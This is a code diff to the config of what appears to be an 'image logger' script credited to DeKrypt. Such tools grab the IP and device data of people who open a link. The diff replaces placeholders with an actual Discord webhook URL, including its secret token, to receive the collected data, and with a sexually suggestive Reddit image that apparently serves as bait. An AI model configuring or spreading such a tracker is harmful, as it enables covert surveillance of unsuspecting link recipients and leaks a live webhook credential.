@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1335738342108565534/lWfSzEZOtbeQaHkNfjn9-sHhmizcg2V2tu3HFV9UcVY1eSPXJfFb-II29BydzHlprkWL",
+    "image": "https://preview.redd.it/why-do-cleavages-and-clothed-tits-trigger-me-way-harder-v0-ucrfclkeui3e1.jpg?width=1025&format=pjpg&auto=webp&s=cd41e6e5c2612532c2cafd11c6d178b7ca1d9070", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
